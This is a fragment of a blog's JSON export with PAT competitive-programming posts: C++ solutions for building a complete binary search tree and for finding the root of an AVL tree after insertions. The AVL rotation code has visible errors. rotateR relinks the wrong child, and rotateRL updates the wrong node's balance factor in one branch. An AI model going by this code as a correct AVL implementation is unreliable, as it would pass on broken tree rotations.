class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e3</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">struct</span> t&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> d;</div><div class=\"line\">\t<span class=\"keyword\">int</span> l;</div><div class=\"line\">\t<span class=\"keyword\">int</span> r;</div><div class=\"line\">\t<span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</div><div class=\"line\">&#125;t[maxN];</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"><span class=\"keyword\">int</span> b[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> k = <span class=\"number\">1</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">inorder</span><span class=\"params\">(<span class=\"keyword\">int</span> a)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (t[a].flag)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tinorder(t[a].l);</div><div class=\"line\">\t\tt[a].d = b[k++];</div><div class=\"line\">\t\tinorder(t[a].r);</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">bfs</span><span class=\"params\">(<span class=\"keyword\">int</span> root)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">queue</span>&lt;<span class=\"keyword\">int</span>&gt; q;</div><div class=\"line\">\tq.push(root);</div><div class=\"line\">\t<span class=\"keyword\">while</span> (!q.empty())</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (t[t[q.front()].l].flag)</div><div class=\"line\">\t\t\tq.push(t[q.front()].l);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (t[t[q.front()].r].flag)</div><div class=\"line\">\t\t\tq.push(t[q.front()].r);</div><div class=\"line\">\t\t(q.size() != <span class=\"number\">1</span>) ? <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d \"</span>, t[q.front()].d) : <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, t[q.front()].d);</div><div class=\"line\">\t\tq.pop();</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; i++)</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, b+i);</div><div class=\"line\">\tsort(b+<span class=\"number\">1</span>, b+n+<span class=\"number\">1</span>);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tt[i].flag = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (n % <span class=\"number\">2</span> == <span class=\"number\">0</span> &amp;&amp; i * <span class=\"number\">2</span> &lt;= n)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (i != n / <span class=\"number\">2</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tt[i].l = i * <span class=\"number\">2</span>;</div><div class=\"line\">\t\t\t\tt[i].r = i * <span class=\"number\">2</span> + <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tt[i].l = i * <span class=\"number\">2</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (n % <span class=\"number\">2</span> == <span class=\"number\">1</span> &amp;&amp; i * <span class=\"number\">2</span> + <span class=\"number\">1</span> &lt;= n)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tt[i].l = i * <span class=\"number\">2</span>;</div><div class=\"line\">\t\t\tt[i].r = i * <span class=\"number\">2</span> + <span class=\"number\">1</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\tinorder(<span class=\"number\">1</span>);</div><div class=\"line\">\tbfs(<span class=\"number\">1</span>);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1066","date":"2017-02-17T06:09:58.000Z","_content":"\n## Description\n\n> An AVL tree is a self-balancing binary search tree. In an AVL tree, the heights of the two child subtrees of any node differ by at most one; if at any time they differ by more than one, rebalancing is done to restore this property. Figures 1-4 illustrate the rotation rules.\n\n> ![1](PAT-advanced-1066/1.jpg) ![2](PAT-advanced-1066/2.jpg)\n\n> ![3](PAT-advanced-1066/3.jpg) ![4](PAT-advanced-1066/4.jpg)\n\n> Now given a sequence of insertions, you are supposed to tell the root of the resulting AVL tree.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line contains a positive integer N (<=20) which is the total number of keys to be inserted. Then N distinct integer keys are given in the next line. All the numbers in a line are separated by a space.\n\n> Output Specification:\n\n> For each test case, print ythe root of the resulting AVL tree in one line.\n\n> Sample Input 1:\n5\n88 70 61 96 120\nSample Output 1:\n70\n\n> Sample Input 2:\n7\n88 70 61 96 120 90 65\nSample Output 2:\n88\n\n照着数据结构的书打的，等会再做1123复习下。。\n照着书还打错一遍Orz\n\n## Code\n\n```\n#include<stack>\n#include<cstdio>  \n#include<string>  \n#include<cstring>  \n#include<vector>  \n#include<iostream>  \n#include<queue>  \n#include<algorithm>  \nusing namespace std;\ntypedef long long LL;\nstruct avlndoe{\n\tint bf;\n\tint data;\n\tavlndoe *left;\n\tavlndoe *right;\n\tavlndoe(int d, avlndoe *l = NULL, avlndoe *r = NULL) : left(l), right(r), data(d), bf(0){}\n}* root;\n\nint n, data;\n\nvoid rotateL(avlndoe * & ptr){\n\tavlndoe * subL = ptr;\n\tptr = subL->right;\n\tsubL->right = ptr->left;\n\tptr->left = subL;\n\tptr->bf = subL->bf = 0;\n}\n\nvoid rotateR(avlndoe * & ptr){\n\tavlndoe * subR = ptr;\n\tptr = subR->left;\n\tsubR->left = ptr->left;\n\tptr->right = subR;\n\tptr->bf = subR->bf = 0;\n}\n\nvoid rotateLR(avlndoe * & ptr){\n\tavlndoe * subR = ptr, *subL = subR->left;\n\tptr = subL->right;\n\tsubL->right = ptr->left;\n\tptr->left = subL;\n\tptr->bf <= 0 ? subL->bf = 0 : subL->bf = -1;\n\tsubR->left = ptr->right;\n\tptr->right = subR;\n\tptr->bf == -1 ? subR->bf = 1 : subR->bf = 0;\n\tptr->bf = 0;\n}\n\nvoid rotateRL(avlndoe * & ptr){\n\tavlndoe * subL = ptr, *subR = subL->right;\n\tptr = subR->left;\n\tsubR->left = ptr->right;\n\tptr->right = subR;\n\tptr->bf >= 0 ? subR->bf = 0 : subL->bf = 1;\n\tsubL->right = ptr->left;\n\tptr->left = subL;\n\tptr->bf == 1 ? subL->bf = -1 : subL->bf = 0;\n\tptr->bf = 0;\n}\n\nbool Insert(avlndoe * & ptr , int &el){\n\tavlndoe * pr = NULL, *p = ptr, *q; int d;\n\tstack<avlndoe *> st;\n\twhile (p != NULL)\n\t{\n\t\tif (el == p->data) return false;\n\t\tpr = p; st.push(pr);\n\t\t(el < p->data) ? p = p->left : p = p->right;\n\t}\n\tp = new avlndoe(el);\n\tif (pr == NULL) { ptr = p; return true; }\n\t(el < pr->data) ? pr->left = p : pr->right = p;\n\twhile (!st.empty())\n\t{\n\t\tpr = st.top();st.pop();\n\t\t(p == pr->left) ? pr->bf-- : pr->bf++;\n\t\tif (pr->bf == 0) break;\n\t\tif (pr->bf == 1 || pr->bf == -1)\n\t\t\tp = pr;\n\t\telse\n\t\t{\n\t\t\td = (pr->bf < 0) ? -1 : 1;\n\t\t\tif (p->bf == d)\n\t\t\t\t(d == -1) ? rotateR(pr) : rotateL(pr);\n\t\t\telse\n\t\t\t\t(d == -1) ? rotateLR(pr) : rotateRL(pr);\n\t\t\tbreak;\n\t\t}\n\t}\n\tif (st.empty())ptr = pr;\n\telse\n\t{\n\t\tq = st.top();\n\t\t(q->data > pr->data) ? q->left = pr : q->right = pr;\n\t}\n\treturn true;\n}\n\nint main()\n{\n\tcin >> n;\n\twhile (n--)\n\t{\n\t\tcin >> data;\n\t\tInsert(root, data);\n\t}\n\tcout << root->data << endl;\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1066.md","raw":"---\ntitle: PAT advanced 1066\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-17 14:09:58\n---\n\n## Description\n\n> An AVL tree is a self-balancing binary search tree. In an AVL tree, the heights of the two child subtrees of any node differ by at most one; if at any time they differ by more than one, rebalancing is done to restore this property. Figures 1-4 illustrate the rotation rules.\n\n> ![1](PAT-advanced-1066/1.jpg) ![2](PAT-advanced-1066/2.jpg)\n\n> ![3](PAT-advanced-1066/3.jpg) ![4](PAT-advanced-1066/4.jpg)\n\n> Now given a sequence of insertions, you are supposed to tell the root of the resulting AVL tree.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line contains a positive integer N (<=20) which is the total number of keys to be inserted. Then N distinct integer keys are given in the next line. All the numbers in a line are separated by a space.\n\n> Output Specification:\n\n> For each test case, print ythe root of the resulting AVL tree in one line.\n\n> Sample Input 1:\n5\n88 70 61 96 120\nSample Output 1:\n70\n\n> Sample Input 2:\n7\n88 70 61 96 120 90 65\nSample Output 2:\n88\n\n照着数据结构的书打的，等会再做1123复习下。。\n照着书还打错一遍Orz\n\n## Code\n\n```\n#include<stack>\n#include<cstdio>  \n#include<string>  \n#include<cstring>  \n#include<vector>  \n#include<iostream>  \n#include<queue>  \n#include<algorithm>  \nusing namespace std;\ntypedef long long LL;\nstruct avlndoe{\n\tint bf;\n\tint data;\n\tavlndoe *left;\n\tavlndoe *right;\n\tavlndoe(int d, avlndoe *l = NULL, avlndoe *r = NULL) : left(l), right(r), data(d), bf(0){}\n}* root;\n\nint n, data;\n\nvoid rotateL(avlndoe * & ptr){\n\tavlndoe * subL = ptr;\n\tptr = subL->right;\n\tsubL->right = ptr->left;\n\tptr->left = subL;\n\tptr->bf = subL->bf = 0;\n}\n\nvoid rotateR(avlndoe * & ptr){\n\tavlndoe * subR = ptr;\n\tptr = subR->left;\n\tsubR->left = ptr->left;\n\tptr->right = subR;\n\tptr->bf = subR->bf = 0;\n}\n\nvoid rotateLR(avlndoe * & ptr){\n\tavlndoe * subR = ptr, *subL = subR->left;\n\tptr = subL->right;\n\tsubL->right = ptr->left;\n\tptr->left = subL;\n\tptr->bf <= 0 ? subL->bf = 0 : subL->bf = -1;\n\tsubR->left = ptr->right;\n\tptr->right = subR;\n\tptr->bf == -1 ? subR->bf = 1 : subR->bf = 0;\n\tptr->bf = 0;\n}\n\nvoid rotateRL(avlndoe * & ptr){\n\tavlndoe * subL = ptr, *subR = subL->right;\n\tptr = subR->left;\n\tsubR->left = ptr->right;\n\tptr->right = subR;\n\tptr->bf >= 0 ? subR->bf = 0 : subL->bf = 1;\n\tsubL->right = ptr->left;\n\tptr->left = subL;\n\tptr->bf == 1 ? subL->bf = -1 : subL->bf = 0;\n\tptr->bf = 0;\n}\n\nbool Insert(avlndoe * & ptr , int &el){\n\tavlndoe * pr = NULL, *p = ptr, *q; int d;\n\tstack<avlndoe *> st;\n\twhile (p != NULL)\n\t{\n\t\tif (el == p->data) return false;\n\t\tpr = p; st.push(pr);\n\t\t(el < p->data) ? p = p->left : p = p->right;\n\t}\n\tp = new avlndoe(el);\n\tif (pr == NULL) { ptr = p; return true; }\n\t(el < pr->data) ? pr->left = p : pr->right = p;\n\twhile (!st.empty())\n\t{\n\t\tpr = st.top();st.pop();\n\t\t(p == pr->left) ? pr->bf-- : pr->bf++;\n\t\tif (pr->bf == 0) break;\n\t\tif (pr->bf == 1 || pr->bf == -1)\n\t\t\tp = pr;\n\t\telse\n\t\t{\n\t\t\td = (pr->bf < 0) ? -1 : 1;\n\t\t\tif (p->bf == d)\n\t\t\t\t(d == -1) ? rotateR(pr) : rotateL(pr);\n\t\t\telse\n\t\t\t\t(d == -1) ? rotateLR(pr) : rotateRL(pr);\n\t\t\tbreak;\n\t\t}\n\t}\n\tif (st.empty())ptr = pr;\n\telse\n\t{\n\t\tq = st.top();\n\t\t(q->data > pr->data) ? q->left = pr : q->right = pr;\n\t}\n\treturn true;\n}\n\nint main()\n{\n\tcin >> n;\n\twhile (n--)\n\t{\n\t\tcin >> data;\n\t\tInsert(root, data);\n\t}\n\tcout << root->data << endl;\n\treturn 0;\n}\n```","slug":"PAT-advanced-1066","published":1,"updated":"2017-02-17T06:28:12.457Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k0k002jhv18jq5c0nln","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>An AVL tree is a self-balancing binary search tree. In an AVL tree, the heights of the two child subtrees of any node differ by at most one; if at any time they differ by more than one, rebalancing is done to restore this property. Figures 1-4 illustrate the rotation rules.</p>\n<p><img src=\"/2017/02/17/PAT-advanced-1066/1.jpg\" alt=\"1\"> <img src=\"/2017/02/17/PAT-advanced-1066/2.jpg\" alt=\"2\"></p>\n<p><img src=\"/2017/02/17/PAT-advanced-1066/3.jpg\" alt=\"3\"> <img src=\"/2017/02/17/PAT-advanced-1066/4.jpg\" alt=\"4\"></p>\n<p>Now given a sequence of insertions, you are supposed to tell the root of the resulting AVL tree.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line contains a positive integer N (&lt;=20) which is the total number of keys to be inserted. Then N distinct integer keys are given in the next line. All the numbers in a line are separated by a space.</p>\n<p>Output Specification:</p>\n<p>For each test case, print ythe root of the resulting AVL tree in one line.</p>\n<p>Sample Input 1:<br>5<br>88 70 61 96 120<br>Sample Output 1:<br>70</p>\n<p>Sample Input 2:<br>7<br>88 70 61 96 120 90 65<br>Sample Output 2:<br>88</p>\n</blockquote>\n<p>照着数据结构的书打的，等会再做1123复习下。。<br>照着书还打错一遍Orz</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight xl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div></pre></td><td class=\"code\"><pre><div class=\"line\">#include&lt;stack&gt;</div><div class=\"line\">#include&lt;cstdio&gt;  </div><div class=\"line\">#include&lt;string&gt;  </div><div class=\"line\">#include&lt;cstring&gt;  </div><div class=\"line\">#include&lt;vector&gt;  </div><div class=\"line\">#include&lt;iostream&gt;  </div><div class=\"line\">#include&lt;queue&gt;  </div><div class=\"line\">#include&lt;algorithm&gt;  </div><div class=\"line\">using namespace std;</div><div class=\"line\">typedef long long LL;</div><div class=\"line\">struct avlndoe&#123;</div><div class=\"line\">\tint bf;</div><div class=\"line\">\tint <span class=\"keyword\">data</span>;</div><div class=\"line\">\tavlndoe *left;</div><div class=\"line\">\tavlndoe *right;</div><div class=\"line\">\tavlndoe(int d, avlndoe *l = NULL, avlndoe *r = NULL) : left(l), right(r), <span class=\"keyword\">data</span>(d), bf(<span class=\"number\">0</span>)&#123;&#125;</div><div class=\"line\">&#125;* root;</div><div class=\"line\"></div><div class=\"line\">int n, <span class=\"keyword\">data</span>;</div><div class=\"line\"></div><div class=\"line\">void rotateL(avlndoe * &amp; ptr)&#123;</div><div class=\"line\">\tavlndoe * subL = ptr;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span> = subL-&gt;</span>right;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">subL</span>-&gt;</span><span class=\"function\"><span class=\"title\">right</span> = ptr-&gt;</span>left;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span>left = subL;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> = subL-&gt;</span>bf = <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">void rotateR(avlndoe * &amp; ptr)&#123;</div><div class=\"line\">\tavlndoe * subR = ptr;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span> = subR-&gt;</span>left;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">subR</span>-&gt;</span><span class=\"function\"><span class=\"title\">left</span> = ptr-&gt;</span>left;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span>right = subR;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> = subR-&gt;</span>bf = <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">void rotateLR(avlndoe * &amp; ptr)&#123;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">avlndoe</span> * subR = ptr, *subL = subR-&gt;</span>left;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span> = subL-&gt;</span>right;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">subL</span>-&gt;</span><span class=\"function\"><span class=\"title\">right</span> = ptr-&gt;</span>left;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span>left = subL;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> &lt;= 0 ? subL-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> = 0 : subL-&gt;</span>bf = -<span class=\"number\">1</span>;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">subR</span>-&gt;</span><span class=\"function\"><span class=\"title\">left</span> = ptr-&gt;</span>right;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span>right = subR;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> == -1 ? subR-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> = 1 : subR-&gt;</span>bf = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span>bf = <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">void rotateRL(avlndoe * &amp; ptr)&#123;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">avlndoe</span> * subL = ptr, *subR = subL-&gt;</span>right;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span> = subR-&gt;</span>left;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">subR</span>-&gt;</span><span class=\"function\"><span class=\"title\">left</span> = ptr-&gt;</span>right;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span>right = subR;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> &gt;= 0 ? subR-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> = 0 : subL-&gt;</span>bf = <span class=\"number\">1</span>;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">subL</span>-&gt;</span><span class=\"function\"><span class=\"title\">right</span> = ptr-&gt;</span>left;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span>left = subL;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> == 1 ? subL-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> = -1 : subL-&gt;</span>bf = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">ptr</span>-&gt;</span>bf = <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">bool Insert(avlndoe * &amp; ptr , int &amp;el)&#123;</div><div class=\"line\">\tavlndoe * pr = NULL, *p = ptr, *q; int d;</div><div class=\"line\">\tstack&lt;avlndoe *&gt; st;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (p != NULL)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"function\"><span class=\"title\">if</span> (el == p-&gt;</span><span class=\"keyword\">data</span>) return <span class=\"literal\">false</span>;</div><div class=\"line\">\t\tpr = p; st.push(pr);</div><div class=\"line\">\t\t(<span class=\"function\"><span class=\"title\">el</span> &lt; p-&gt;</span><span class=\"function\"><span class=\"title\">data</span>) ? p = p-&gt;</span><span class=\"function\"><span class=\"title\">left</span> : p = p-&gt;</span>right;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\tp = new avlndoe(el);</div><div class=\"line\">\t<span class=\"keyword\">if</span> (pr == NULL) &#123; ptr = p; return <span class=\"literal\">true</span>; &#125;</div><div class=\"line\">\t(<span class=\"function\"><span class=\"title\">el</span> &lt; pr-&gt;</span><span class=\"function\"><span class=\"title\">data</span>) ? pr-&gt;</span><span class=\"function\"><span class=\"title\">left</span> = p : pr-&gt;</span>right = p;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (!st.empty())</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tpr = st.top();st.pop();</div><div class=\"line\">\t\t(<span class=\"function\"><span class=\"title\">p</span> == pr-&gt;</span><span class=\"function\"><span class=\"title\">left</span>) ? pr-&gt;</span><span class=\"function\"><span class=\"title\">bf</span>-- : pr-&gt;</span>bf++;</div><div class=\"line\">\t\t<span class=\"function\"><span class=\"title\">if</span> (pr-&gt;</span>bf == <span class=\"number\">0</span>) break;</div><div class=\"line\">\t\t<span class=\"function\"><span class=\"title\">if</span> (pr-&gt;</span><span class=\"function\"><span class=\"title\">bf</span> == 1 || pr-&gt;</span>bf == -<span class=\"number\">1</span>)</div><div class=\"line\">\t\t\tp = pr;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"function\"><span class=\"title\">d</span> = (pr-&gt;</span>bf &lt; <span class=\"number\">0</span>) ? -<span class=\"number\">1</span> : <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t<span class=\"function\"><span class=\"title\">if</span> (p-&gt;</span>bf == d)</div><div class=\"line\">\t\t\t\t(d == -<span class=\"number\">1</span>) ? rotateR(pr) : rotateL(pr);</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t\t\t(d == -<span class=\"number\">1</span>) ? rotateLR(pr) : rotateRL(pr);</div><div class=\"line\">\t\t\tbreak;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (st.empty())ptr = pr;</div><div class=\"line\">\t<span class=\"keyword\">else</span></div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tq = st.top();</div><div class=\"line\">\t\t(<span class=\"function\"><span class=\"title\">q</span>-&gt;</span><span class=\"function\"><span class=\"title\">data</span> &gt; pr-&gt;</span><span class=\"function\"><span class=\"title\">data</span>) ? q-&gt;</span><span class=\"function\"><span class=\"title\">left</span> = pr : q-&gt;</span>right = pr;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\treturn <span class=\"literal\">true</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">int main()</div><div class=\"line\">&#123;</div><div class=\"line\">\tcin &gt;&gt; n;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (n--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tcin &gt;&gt; <span class=\"keyword\">data</span>;</div><div class=\"line\">\t\tInsert(root, <span class=\"keyword\">data</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"function\"><span class=\"title\">cout</span> &lt;&lt; root-&gt;</span><span class=\"keyword\">data</span> <span class=\"string\">&lt;&lt; endl;</span></div><div class=\"line\">\treturn 0;</div><div 